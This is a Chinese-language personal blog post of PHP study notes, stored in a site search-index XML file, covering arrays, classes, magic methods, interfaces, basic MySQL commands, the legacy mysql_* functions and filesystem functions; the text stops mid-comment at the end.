<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[php基础]]></title>
    <url>%2F2018%2F08%2F30%2Fphp%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[数组直接赋值声明 索引数组：下标为数字 12345$arr1[0] = 1;$arr1[1] = 2;$arr1[2] = 3;print_r($arr1);echo '&lt;br&gt;'; 关联数组：下标为字符串 12345$arr2['one'] = 1;$arr2['two'] = 2;$arr2['three'] = 3;print_r($arr2);echo '&lt;br&gt;'; */ []和{}可以访问下标，建议使用[]，因为 echo “$arr1{0}2222”; 报错 12echo $arr1[0];echo $arr1&#123;0&#125;; 下标是字符串，数字字符串转化为整数 123$arr1['2'] = 'a';print_r($arr1); // Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; a )echo '&lt;br&gt;'; 例外，’08’不会转化成8，而是’08’，被当作八进制 123$arr1['01'] = '01';print_r($arr1); // Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [01] =&gt; 01 )echo '&lt;br&gt;'; 下标是浮点数，小数部分会被舍弃 123$arr1[1.8] = 1.8;print_r($arr1); // Array ( [0] =&gt; 1 [1] =&gt; 1.8 [2] =&gt; 3 )echo '&lt;br&gt;'; 下标是布尔值，true转化为1，false转化为0 123$arr1[true] = 'true';print_r($arr1); // Array ( [0] =&gt; 1 [1] =&gt; true [2] =&gt; 3 )echo '&lt;br&gt;'; 下标是null，转化为空字符串’’ 123$arr1[null] = 'null';print_r($arr1); // Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [] =&gt; null )echo '&lt;br&gt;'; 数组和对象做下标会有警告 12345678910$index = array();$arr1[$index] = '$index';print_r($arr1); // Warning: Illegal offset type */```[]`不写下标，会自动增加索引```js$arr1[] = '[]';print_r($arr1); // Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; [] ) 默认从零开始，当前数组索引出现过的最大值加1 123$arr1[8] = 8;$arr1[] = '9';print_r($arr1); // Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [8] =&gt; 8 [9] =&gt; 9 ) 关联数组不会影响索引下标的排列规则 1234$arr1['one'] = 'one';print_r($arr1); // Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [one] =&gt; one )$arr1[] = 'two';print_r($arr1); // Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [one] =&gt; one [3] =&gt; two ) 使用array声明数组，默认是索引的下标，从0开始 12$arr = array('a', 'b', 'c');print_r($arr); // Array ( [0] =&gt; a [1] =&gt; b [2] =&gt; c ) 可以使用=&gt;符号指定下标 12$arr = array('aaa', 'two'=&gt;'bbb', 'ccc');print_r($arr); php5.4+，可以使用 12$arr = ['aaa', 'two'=&gt;'bbb', 'ccc'];print_r($arr); // Array ( [0] =&gt; aaa [two] =&gt; bbb [1] =&gt; ccc ) unset删除数组中一个元素，array_values重新索引 1234567$arr = ['a', 'b', 'c'];// `unset`删除数组中一个元素unset($arr[1]);print_r($arr); // Array ( [0] =&gt; a [2] =&gt; c )// `array_values`重新索引$arr = array_values($arr);print_r($arr); // Array ( [0] =&gt; a [1] =&gt; c ) list()遍历，左边是list函数，等号右边只能是一个数组，只能是索引数组（下标是连续的），list()中的参数和数组总一一对应 12345$str = 'zs_ls_ww';list($a, $b, $c) = explode('_', $str);echo $a . '&lt;br&gt;'; // 'zs'echo $b . '&lt;br&gt;'; // 'ls'echo $c . '&lt;br&gt;'; // 'ww' each()遍历，each()只处理当前元素，指针指向当前元素，下一次调用，指针指向下一个元素，最后一个元素再调用返回false 123456789$arr = ['zs', 'ls', 'ww'];$one = each($arr);echo '&lt;pre&gt;';print_r($one);echo '&lt;/pre&gt;';$two = each($arr);echo '&lt;pre&gt;';print_r($two);echo '&lt;/pre&gt;'; 结合list()和each()遍历 1234$arr = ['zs', 'ls', 'ww'];while (list($key, $val) = each($arr)) &#123; echo "&#123;$key&#125;".'---'."&#123;$val&#125;".'&lt;br&gt;';&#125; 数组地址访问方法 prev() next() reset() end() key() current() 12345$arr = ['one'=&gt;'1', 'two'=&gt;'2', 'three'=&gt;'3'];next($arr);print_r(key($arr)); // twoecho key($arr); // twoecho current($arr); // 2 超全局数组（变量），在php中，已经声明完的变量，你可以直接就去使用，变量名字已经规定好了，$_SERVER $_ENV $_GET $_POST $_FILES $_COOKIE $_SESSION $GLOBALS 123foreach ($_SERVER as $key =&gt; $value) &#123; echo $key.'---&gt;'.$value.'&lt;br&gt;';&#125; 数组相关的函数 12345678910111213141516171819202122232425262728293031323334353637$lamp = array('os'=&gt;'Linux', 'webserver'=&gt;'Apache', 'db'=&gt;'Mysql', 'language'=&gt;'PHP', 'num'=&gt;10);Print_r($lamp);echo '&lt;br&gt;';// `array_values()` 获取数组值$val = array_values($lamp);print_r($val);echo '&lt;br&gt;';// `array_keys(input, search_value, strict)` 获取数组键$key = array_keys($lamp, 'Apache', true);print_r($key);echo '&lt;br&gt;';// `in_array($needle, $haystack, strict)` 检查数组中是否存在某个值，返回布尔值$in = in_array('10', $lamp, true);echo $in ? '在数组中':'不在数组中';echo '&lt;br&gt;';// `array_search($needle, $haystack, strick)` 检查数组中是否存在某个值，返回键名$s = array_search('10', $lamp);echo $s;echo '&lt;br&gt;';// `array_key_exist($key, $haystack, strick)` 检查数组中键名是否存在$k = array_key_exists('db', $lamp);echo $k ? '键在数组中' : '键不在数组中';echo '&lt;br&gt;';// `array_flip($haystack)` 交换数组中的键和值$f = array_flip($lamp);print_r($f);echo '&lt;br&gt;';// `array_reverse($haystack)` 返回一个单元顺序相反的数组$r = array_reverse($lamp);print_r($r); 统计数组元素个数和唯一性 12345678910111213141516$lamp = ['os'=&gt;'Linux', 'Linux', 'webserver'=&gt;'Apache'];$web = [ 'lamp'=&gt;['os'=&gt;'Linux', 'webserver'=&gt;'Apache'], 'javaEE'=&gt;['os'=&gt;'Unix', 'webserver'=&gt;'Tomcat']];// `count($arr, $mode)`，计算数组元素个数，第二个参数为真，递归累加数组元素个数echo count($web, true);echo '&lt;br&gt;';// array_count_values($input)，统计数组重复值的出现个数print_r(array_count_values($lamp)); // Array ( [Linux] =&gt; 2 [Apache] =&gt; 1 )echo '&lt;br&gt;';// array_unique($arr) ，去除数组重复值print_r(array_unique($lamp)); // Array ( [os] =&gt; Linux [webserver] =&gt; Apache ) 使用回调函数处理数组的函数 array_filter($input, fn)过滤数组，不传回调函数，返回值为真的元素 1234567$arr = [1, 2, 3, null, -1, 'a', false, true];var_dump($arr);var_dump(array_filter($arr));var_dump(array_filter($arr, function($var) &#123; return $var % 2;&#125;));var_dump($arr); unset() 删除数组本身的元素 12unset($arr[1]);var_dump($arr); array_walk($arr, $fn, $userdata)对数组的每个成员应用用户函数 1234567$arr = [1, 2, 3, null, -1, 'a', false, true];array_walk($arr, function(&amp;$val, $key, $userdata) &#123; $val = $val * 2; echo $userdata; echo '&lt;br&gt;';&#125;, '###');print_r($arr); array_map($fn, $arr1, $arr2,...)作用于数组的每个元素上 12345$arr1 = [1, 2, 4];$arr2 = ['a', 'b', 'c'];array_map(function($val1, $val2) &#123; echo "&#123;$val1&#125; =&gt; &#123;$val2&#125;&lt;br&gt;";&#125;, $arr1, $arr2); 当第一参数回调函数为空，返回结果是数组对应各项合并 123$arr3 = [false, true];$m = array_map(null, $arr1, $arr2, $arr3);var_dump($m); 冒泡排序123456789101112131415function bubbleSort($arr) &#123; $len = count($arr); for ($i = 0; $i &lt; $len; $i++) &#123; for ($j = 0; $j &lt; $len - 1 - $i; $j++) &#123; if($arr[$j] &gt; $arr[$j + 1]) &#123; $tmp = $arr[$j]; $arr[$j] = $arr[$j + 1]; $arr[$j + 1] = $tmp; &#125; &#125; &#125; return $arr;&#125;$arr = [0, 12, 2, 3, 14, 5, 6, 7, 8, 9];print_r(bubbleSort($arr)); 数组拆分、合并、分解 array_slice($arr, $offset, $len, true)从数组中取出一段 123$arr = ['a', 'b', 'c', 'd'];$narr = array_slice($arr, 2, 1, true);print_r($narr); // Array ( [2] =&gt; c ) array_splice(&amp;$input, $offset, $len, $replace) 把数组中的一部分去掉并用其他值取代 12345$arr = ['a', 'b'=&gt;2, 'c', 'd'];$narr = array_splice($arr, 1, 1, 'rrr');print_r($narr);echo '&lt;br&gt;';print_r($arr); array_combine($keys, $values) 创建一个数组，用一个数组的值作为其键名，另一个数组作为其值 1234$arr1 = ['a', 'b', 'c'];$arr2 = ['php', 'linux', 'mysql'];$c = array_combine($arr1, $arr2);print_r($c); // Array ( [a] =&gt; php [b] =&gt; linux [c] =&gt; mysql ) +下标相同的会覆盖，前面的覆盖后面的 12345$a = ['a', 'two'=&gt;'b', 'c'];$b = [7, 'two' =&gt; 8, 9];$c = $a + $b;print_r($c); // Array ( [0] =&gt; a [two] =&gt; b [1] =&gt; c )echo '&lt;br&gt;'; array_merge($arr1, $arr2, ...)合并数组，索引数组下标相同不覆盖，关联数组下标相同会覆盖 12$m = array_merge($a, $b);print_r($m); // Array ( [0] =&gt; a [two] =&gt; 8 [1] =&gt; c [2] =&gt; 7 [3] =&gt; 9 ) array_intersect($arr1, $arr2, $arr3...)计算数组交集 1234$arr1 = [4, 5, 6, 7, 8];$arr2 = [5, 6, 7, 8, 9];$intersect= array_intersect($arr1, $arr2);print_r($intersect); // Array ( [1] =&gt; 5 [2] =&gt; 6 [3] =&gt; 7 [4] =&gt; 8 ) array_diff($arr1, $arr2) 计算数组差集 1234$arr1 = [4, 5, 6, 7, 8];$arr2 = [5, 6, 7, 8, 9];$diff = array_diff($arr1, $arr2);print_r($diff); // Array ( [0] =&gt; 4 ) 类1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980class Person &#123; // 在类的成员属性前面一定要有一个修饰词，如果不知道使用什么修饰词，就可以使用var（关键字） // 如果一旦有其他的修饰词就不要有var // 变量（成员属性） private $name = 'wuwh'; private $age; private $gender; // 构造方法 function __construct($name='', $age = 1, $gender = 'male') &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;gender = $gender; &#125; // 在直接读取私有属性时自动调用 function __get($name) &#123; echo $name; echo '&lt;br&gt;'; return $this-&gt;$name; &#125; // 在直接设置私有属性时调用 function __set($name, $value) &#123; $this-&gt;$name = $value; &#125; // 在使用`isset()`判断一个私有属性是否存在时，自动调用`__isset()`方法 function __isset($name) &#123; if($name == 'name') &#123; return isset($this-&gt;$name); &#125; &#125; // 在使用`unset()`删除一个私有属性时，自动调用`__unset()`方法 function __unset($name) &#123; if($name == 'name') &#123; unset($this-&gt;$name); &#125; &#125; // 函数（成员方法） // 方法前面加修饰符 `private`，外部不能调用，但是内部方法可以调用 function getName() &#123; return $this-&gt;name; &#125; function getAge() &#123; return $this-&gt;age; &#125; // 私有方法 private function g() &#123; return $this-&gt;gender; &#125; function getGender() &#123; return $this-&gt;g(); &#125; // 析构方法 function __destruct() &#123; echo "destory &#123;$this-&gt;name&#125; over!"; &#125;&#125;$person = new Person('zhangsan', 11, 'female');echo $person-&gt;getName();echo '&lt;br&gt;';echo $person-&gt;getAge();echo '&lt;br&gt;';echo $person-&gt;getGender();echo '&lt;br&gt;';// 魔术方法// `__get()` `__set()` `__isset()` `__unset()`// 读取私有属性，调用`__get()`方法$person-&gt;name;// 设置私有属性，调用`__set()`方法$person-&gt;name = 'abc';echo '&lt;br&gt;';/* unset($person-&gt;name);print_r($person); */if(isset($person-&gt;name)) &#123; echo '存在该属性';&#125; else &#123; echo '不存在该属性';&#125; 继承12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667// `private`这是私有的，只能自己用，子类也不能使用// `protected`保护权限，只能是自己和自己的子类中可以使用// `final`在类前面加这个关键字，则不能让这个类被继承，也可以修饰方法，不能让子类覆盖这个方法class Person &#123; public $name; private $age; private $gender; public static $country = 'cn'; function __construct($name, $age, $gender) &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;gender = $gender; &#125; function say() &#123; echo "my name is &#123;$this-&gt;name&#125;, my age is &#123;$this-&gt;age&#125;, my gender is &#123;$this-&gt;gender&#125; "; // `self`指向类本身 echo 'my country is '.self::$country; echo '&lt;br&gt;'; &#125; function eat() &#123; echo 'person can eat'; &#125;&#125;class Student extends Person &#123; var $school; function __construct($name = '', $age = 1, $gender = 'male', $school = '') &#123; // 覆盖父类中的`__construct()`构造方法 Parent::__construct($name, $age, $gender); $this-&gt;school = $school; &#125; function study() &#123; echo "before studying, say &#123;$this-&gt;name&#125;"; echo '&lt;br&gt;'; &#125; /* function say() &#123; echo "I am a student, my name is &#123;$this-&gt;name&#125;"; echo '&lt;br&gt;'; &#125; */ function say() &#123; // 类::成员，使用 `Parent::成员` 访问父类中被覆盖的方法 Parent::say(); echo "my school is &#123;$this-&gt;school&#125;"; echo '&lt;br&gt;'; &#125;&#125;class Teacher extends Person &#123; var $job; function teach() &#123; echo( "before teaching, say &#123;$this-&gt;name&#125;"); &#125;&#125;$student = new Student('wuwh', 22, 'male', 'qing university');$student-&gt;say();$student-&gt;study();// `instanceof`if($student instanceof Person) &#123; echo '$student属于Person类'; echo '&lt;br&gt;';&#125; else &#123; echo '$student不属于Person类'; echo '&lt;br&gt;';&#125;// 静态成员只能用类来访问echo Student::$country; 魔术方法12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788// 魔术方法 `__construct()` `__desctruct()` `__set()` `__get()` `__isset()` `__unset()`class Person &#123; public $name; public $age; public $gender; function __construct($name, $age, $gender) &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;gender = $gender; &#125; // 魔术方法`__tostring()`，在直接使用`echo` `print` `printf`输出一个对象引用时，自动调用这个方法 // 将对象的基本信息放在`__tostring`内部，形成字符串返回 // `__tostring()`不能有参数，返回一个字符串 function __toString() &#123; return "my name is &#123;$this-&gt;name&#125;, my age is &#123;$this-&gt;age&#125;, my gender is &#123;$this-&gt;gender&#125;"; &#125; // 在克隆对象时自动调用 // 和构造方法一样，对新克隆对象进行初始化 // `this`指向副本 function __clone() &#123; echo 'clone...'; echo '&lt;br&gt;'; $this-&gt;name = 'clone wuwh'; $this-&gt;age = 100; $this-&gt;gender = 'female'; &#125; // 调用一个对象中不存在的方法时，自动调用的方法 // 有两个参数，第一个是方法名，第二个是方法的参数 function __call($method, $args) &#123; print_r("sorry, there is not exist the function which method &#123;$method&#125;, arguments are"); // print_r($args); // `serialize()`序列化，对象转化成字符串 // `unserialize()`反序列化，字符串转化成对象 echo '&lt;br&gt;'; echo serialize($args); echo '&lt;br&gt;'; &#125; // 在序列化时，自动调用的方法，返回一个数组中声明了的属性名会被序列化 function __sleep() &#123; echo '序列化自动调用了...'; echo '&lt;br&gt;'; return array('name'); &#125; // 在反序列化时，自动调用的方法 function __wakeup() &#123; echo '反序列化自动调用了...'; echo '&lt;br&gt;'; &#125; // 使用`var_export()`方法时，自动调用的方法 static function __set_state($arr) &#123; &#125; // `$person()`，自动调用的方法，php5.3+ function __invoke() &#123; echo '实例调用了'; echo '&lt;br&gt;'; &#125; // `Person::hello()`，调用不存在的静态方法时自动调用 static function __callStatic($method, $args) &#123; echo "你调用的静态方法&#123;$method&#125;不存在"; echo '&lt;br&gt;'; &#125; function say() &#123; print_r("my name is &#123;$this-&gt;name&#125;, my age is &#123;$this-&gt;age&#125;, my gender is &#123;$this-&gt;gender&#125;"); &#125;&#125;$person = new Person('wuwh', 22, 'male');// 序列化$ser = serialize($person);echo $ser;echo '&lt;br&gt;';// 反序列化$unser = unserialize($ser);echo $unser;echo '&lt;br&gt;';$p = clone $person;$p-&gt;say();$p-&gt;aaa('a', 'a', 'a');/* $ex = var_export($p, true);var_dump($ex); */// 调用静态方法`__invoke()`$p();// 调用 `__callStatic()`Person::hello(); 接口1234567891011121314151617181920212223242526272829303132/** * 接口和抽象类对比 * 1. 接口中的方法，必须全是抽象方法 * 2. 接口中的成员属性，必须是常量 * 3. 所有的权限必须是共有的 * 4. 声明接口不使用class，而是使用interface */interface Demo &#123; // 接口中的成员属性，必须是常量 const NAME = 'ABC'; // 抽象方法修饰符`static`可以省略 function a(); function b();&#125;// 可以使用`extends`让一个接口继承另一个接口interface Test extends Demo &#123; function t();&#125;class Word &#123; function w() &#123; &#125;&#125;// 可以使用一个类来实现接口中的全部方法，可以使用一个抽象类，来实现接口中的部分方法// 一个类可以在继承另一个类的同时，使用`implements`实现一个接口，可以实现多个接口（一定要先继承，再实现接口）class Hello extends Word implements Test &#123; function a() &#123;&#125; function b() &#123;&#125; function t() &#123;&#125;&#125; 单例模式12345678910111213141516171819202122232425// 单例模式class Person &#123; static $obj = null; static function getObj() &#123; if(!self::$obj instanceof self) &#123; self::$obj = new self; &#125; /* if(is_null(self::$obj)) &#123; self::$obj = new self; &#125; */ return self::$obj; &#125; function __construct()&#123; echo 'hello...'; &#125; function __destruct() &#123; echo 'destruct...'; &#125;&#125;Person::getObj();Person::getObj();Person::getObj();Person::getObj();Person::getObj(); 数据库配置环境变量，可以直接使用mysql命令：此电脑-&gt;属性-&gt;高级-&gt;环境变量 连接远程数据库 -u用户名 -p密码mysql -h localhost -uroot -p 获取user表格所有数据select * from mysql.user create database [dbname]添加库 12mysql&gt; create database aaa;Query OK, 1 row affected (0.00 sec) show databases查看数据库 1234567891011mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || test || xsphp |+--------------------+5 rows in set (0.16 sec) use [dbname]切换到数据库 12mysql&gt; use xsphpDatabase changed show tables查看表格 12mysql&gt; show tables;Empty set (0.00 sec) create table [tablename]创建一个表格 12mysql&gt; create table users(id int not null auto_increment primary key);Query OK, 0 rows affected (0.64 sec) 再查看表格列表 1234567mysql&gt; show tables;+-----------------+| Tables_in_xsphp |+-----------------+| users |+-----------------+1 row in set (0.00 sec) desc [tablename]查看表格详细信息 1234567mysql&gt; desc users;+-------+---------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+-------+---------+------+-----+---------+----------------+| id | int(11) | NO | PRI | NULL | auto_increment |+-------+---------+------+-----+---------+----------------+1 row in set (0.13 sec) alter table [tablename] add [field] [desc]新增字段 123456789101112mysql&gt; alter table users add username char(30) not null default &apos;&apos;;Query OK, 0 rows affected (0.46 sec)Enregistrements: 0 Doublons: 0 Avertissements: 0mysql&gt; desc users;+----------+----------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+----------+------+-----+---------+----------------+| id | int(11) | NO | PRI | NULL | auto_increment || username | char(30) | NO | | | |+----------+----------+------+-----+---------+----------------+2 rows in set (0.01 sec) show create table [tablename]查看创建表格语句 123456mysql&gt; show create table users;| users | CREATE TABLE `users` ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` char(30) NOT NULL DEFAULT &apos;&apos;, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=latin1 | 再增加一个字段 12345678910111213mysql&gt; alter table users add password varchar(40) not null default &apos;&apos;;Query OK, 0 rows affected (0.36 sec)Enregistrements: 0 Doublons: 0 Avertissements: 0mysql&gt; desc users;+----------+-------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+----------------+| id | int(11) | NO | PRI | NULL | auto_increment || username | char(30) | NO | | | || password | varchar(40) | NO | | | |+----------+-------------+------+-----+---------+----------------+3 rows in set (0.01 sec) alter table [tablename] drop column [field]删除字段 123456789101112mysql&gt; alter table users drop column password;Query OK, 0 rows affected (0.34 sec)Enregistrements: 0 Doublons: 0 Avertissements: 0mysql&gt; desc users;+----------+----------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+----------+------+-----+---------+----------------+| id | int(11) | NO | PRI | NULL | auto_increment || username | char(30) | NO | | | |+----------+----------+------+-----+---------+----------------+2 rows in set (0.01 sec) alter table [tablename] modify column [filed] [desc]修改一个字段 123456789101112mysql&gt; alter table users modify column username char(22);Query OK, 0 rows affected (0.51 sec)Enregistrements: 0 Doublons: 0 Avertissements: 0mysql&gt; desc users;+----------+----------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+----------+------+-----+---------+----------------+| id | int(11) | NO | PRI | NULL | auto_increment || username | char(22) | YES | | NULL | |+----------+----------+------+-----+---------+----------------+2 rows in set (0.01 sec) insert into [tablename] (key1, key2, ...) values (value1, value2, ...)添加数据 12345678910mysql&gt; insert into users (username, password) values (&apos;admin&apos;, &apos;admin&apos;);Query OK, 1 row affected (0.07 sec)mysql&gt; select * from users;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | admin | admin |+----+----------+----------+1 row in set (0.00 sec) update [tablename] set [field]=value1, [field]=values2 where [conditions] 修改数据 12345678910111213mysql&gt; update users set username=&apos;www&apos;, password=&apos;123456&apos; where id=3;Query OK, 1 row affected (0.09 sec)Enregistrements correspondants: 1 Modifi茅s: 1 Warnings: 0mysql&gt; select * from users;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | admin | admin || 2 | boss | boss || 3 | www | 123456 |+----+----------+----------+3 rows in set (0.00 sec) delete from [tablename] where [conditions]删除数据 12345678mysql&gt; select * from users;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | admin | admin || 3 | www | 123456 |+----+----------+----------+2 rows in set (0.00 sec) drop table [tablename]删除表 drop database [dbname]删除库 PHP操作数据库12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// 连接数据库（返回资源）$link = @mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;&apos;);if(!$link) &#123; echo &apos;连接数据库失败！&lt;br&gt;&apos;; echo mysql_error();&#125;// 设置操作// mysql_query(&apos;set names utf8&apos;); // 设置字符集为utf-8// 选择一个数据库作为默认的数据库使用mysql_select_db(&apos;xsphp&apos;);// 操作数据库的sql语句执行$sql = &apos;select id, username, password from users order by id&apos;;// 执行sql语句$result = mysql_query($sql);// 前一个操作影响的行数（判断表是否有变化）// echo mysql_affected_rows().&apos;&lt;br&gt;&apos;;// echo mysql_insert_id();// 从结果集这个资源中获取想要的结果// `mysql_fetch_row($result)` 转化成索引数组// `mysql_fetch_assoc($result)` 转化成关联数组// `mysql_fetch_array($result, MYSQL_ASSOC)` 转化索引数组和关联数组的组合，第二个参数可取值：MYSQL_ASSOC（关联），MYSQL_NUM（索引），MYSQL_BOTH（默认两个都返回）// `mysql_fetch_object($result) ` 转化为对象// 默认指针指向第一条（可以使用`mysql_data_seek`改变自己定义的指定位置）// 获取一条后，指针自动移动下一位置，最后一个位置返回false// mysql_data_seek($result, 1);/* print_r(mysql_fetch_row($result));echo &apos;&lt;br&gt;&apos;; */echo &apos;&lt;table border=&quot;1&quot;&gt;&apos;;echo &apos;&lt;tr&gt;&apos;;for($i = 0; $i &lt; mysql_num_fields($result); $i++) &#123; echo &apos;&lt;td&gt;&apos;.mysql_field_name($result, $i).&apos;&lt;/td&gt;&apos;;&#125;echo &apos;&lt;/tr&gt;&apos;;while ($row = mysql_fetch_assoc($result)) &#123; echo &apos;&lt;tr&gt;&apos;; echo &quot;&lt;td&gt;&#123;$row[&apos;id&apos;]&#125;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&#123;$row[&apos;username&apos;]&#125;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&#123;$row[&apos;password&apos;]&#125;&lt;/td&gt;&quot;; /* foreach ($row as $key =&gt; $value) &#123; echo &quot;&lt;td&gt;&#123;$value&#125;&lt;/td&gt;&quot;; &#125; */ echo &apos;&lt;/tr&gt;&apos;;&#125;echo &apos;&lt;/table&gt;&apos;;echo &apos;共有&apos;.mysql_num_rows($result).&apos;条记录；&apos;.mysql_num_fields($result).&apos;个字段&apos;;print_r(mysql_fetch_assoc($result));echo &apos;&lt;br&gt;&apos;;var_dump($result);// 关闭连接mysql_close($link); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); //设置编码 /* function parseFileSize($size) &#123; if($size &gt; pow(2, 40)) &#123; $size = $size / pow(2, 40); $suffix = &apos;TB&apos;; &#125; else if($size &gt; pow(2, 30)) &#123; $size = $size / pow(2, 30); $suffix = &apos;GB&apos;; &#125; else if ($size &gt; pow(2, 20)) &#123; $size = $size / pow(2, 20); $suffix = &apos;MB&apos;; &#125; else if ($size &gt; pow(2, 10)) &#123; $size = $size / pow(2, 10); $suffix = &apos;KB&apos;; &#125; else &#123; $suffix = &apos;Types&apos;; &#125; return $size.$suffix; &#125; */ /* function getFilePro($filename) &#123; if(file_exists($filename)) &#123; // `filesize($filename)`文件大小 echo parseFileSize(filesize($filename)); echo &apos;&lt;br&gt;&apos;; // `is_dir($filename)`是否目录 if(is_dir($filename)) &#123; echo &apos;这是一个目录&lt;br&gt;&apos;; &#125; // `is_file($filename)`是否为文件 if(is_file($filename)) &#123; echo &apos;这是一个文件&lt;br&gt;&apos;; &#125; // `is_readable($filename)`是否可读 if(is_readable($filename)) &#123; echo &apos;文件可读&lt;br&gt;&apos;; &#125; // `is_writeable($filename)`是否可写 if(is_writable($filename)) &#123; echo &apos;文件可写&lt;br&gt;&apos;; &#125; // `is_excutable($filename)`是否可执行 if(is_executable($filename)) &#123; echo &apos;文件可执行&lt;br&gt;&apos;; &#125; // 创建时间 echo &apos;创建时间：&apos;.date(&apos;y-m-d h:m:s&apos;, filectime($filename)).&apos;&lt;br&gt;&apos;; // 访问时间 echo &apos;访问时间：&apos;.date(&apos;y-m-d h:m:s&apos;, fileatime($filename)).&apos;&lt;br&gt;&apos;; // 修改时间 echo &apos;修改时间：&apos;.date(&apos;y-m-d h:m:s&apos;, filemtime($filename)).&apos;&lt;br&gt;&apos;; &#125; else &#123; echo &apos;文件不存在！&lt;br&gt;&apos;; &#125; &#125; getFilePro(&apos;./test.txt&apos;); */ /* function getFileType($filename) &#123; if(!file_exists($filename)) &#123; echo &apos;文件不存在！&apos;; return false; &#125; // `filetype()`返回文件类型 // 文件类型 fifo, char, dir, block, link, file switch (filetype($filename)) &#123; case &apos;dir&apos;: echo &apos;这是一个目录&lt;br&gt;&apos;; break; case &apos;char&apos;: echo &apos;这是一个字符设置&lt;br&gt;&apos;; break; case &apos;block&apos;: echo &apos;这是一块设备&lt;br&gt;&apos;; break; case &apos;file&apos;: echo &apos;这是一个文件&lt;br&gt;&apos;; break; case &apos;link&apos;: echo &apos;这是一个链接&lt;br&gt;&apos;; break; default: break; &#125; &#125; getFileType(&apos;./test.txt&apos;); */ /* $filename = &apos;http://baidu.com/search/index.php?w=666&apos;; // `basename` `dirname` `pathinfo` echo &apos;basename:&apos;.basename($filename).&apos;&lt;br&gt;&apos;; echo &apos;dirname:&apos;.dirname($filename).&apos;&lt;br&gt;&apos;; echo &apos;pathinfo:&apos;; // print_r(pathinfo($filename)); // `glob()`遍历文件 foreach(glob(&apos;./php/*.dll&apos;) as $filename) &#123; echo $filename; echo &apos;&lt;br&gt;&apos;; &#125; // `opendir($path)`打开目录资源 $dir = opendir(&apos;php&apos;); // `readdir($dir_handle)`读取目录 while($filename = readdir($dir)) &#123; if($filename != &apos;.&apos; &amp;&amp; $filename != &apos;..&apos;) &#123; $filename = &apos;php/&apos;.$filename; if(is_file($filename)) &#123; echo &apos;文件：&apos;.$filename.&apos;&lt;br&gt;&apos;; &#125; else &#123; echo &apos;目录：&apos;.$filename.&apos;&lt;br&gt;&apos;; &#125; &#125; &#125; echo &apos;########################&lt;br&gt;&apos;; // `rewinddir($dir_handle)`倒回目录句柄 rewinddir($dir); while($filename = readdir($dir)) &#123; if($filename != &apos;.&apos; &amp;&amp; $filename != &apos;..&apos;) &#123; $filename = &apos;php/&apos;.$filename; if(is_file($filename)) &#123; echo &apos;文件：&apos;.$filename.&apos;&lt;br&gt;&apos;; &#125; else &#123; echo &apos;目录：&apos;.$filename.&apos;&lt;br&gt;&apos;; &#125; &#125; &#125; // 关闭目录资源 closedir($dir); */ // `disk_total_space($directory)` 磁盘总大小 $total = disk_total_space(&apos;c:&apos;); echo &apos;c盘总大小：&apos;.($total / pow(2, 30)).&apos;&lt;br&gt;&apos;; // `disk_free_space($directory)` 磁盘剩余空间 $free = disk_free_space(&apos;c:&apos;); echo &apos;c盘剩余可用空间：&apos;.($free / pow(2, 30)).&apos;&lt;br&gt;&apos;; $dirnum = 0; // 目录总数 $filenum = 0; // 文件总数 $filesize = 0; // 文件总大小 function getDirNum($file) &#123; global $dirnum; global $filenum; $dir = opendir($file); while($filename = readdir($dir)) &#123; if($filename != &apos;.&apos; &amp;&amp; $filename != &apos;..&apos;) &#123; $filename = $file.&apos;/&apos;.$filename; if(is_dir($filename)) &#123; $dirnum++; getDirNum($filename); &#125; else &#123; $filenum++; $filesize += filesize($filename); &#125; &#125; &#125; closedir($dir); &#125; $directory = &apos;php&apos;; getDirNum($directory); echo $directory.&apos;文件夹下的目录总个数&apos;.$dirnum; echo $directory.&apos;文件夹下的文件总个数&apos;.$filenum; echo $directory.&apos;文件夹下的文件总大小：&apos;.$filesize; // `touch($filename)`创建一个空文件 // touch(&apos;demo.js&apos;); // `copy($source, $dest)`复制文件 // copy(&apos;demo.js&apos;, &apos;text.js&apos;); // `rename($oldname, $newname)`移动或重命名一个文件 // rename(&apos;demo.js&apos;, &apos;demo_rename.js&apos;); // `unlink($filename)`删除一个文件 // 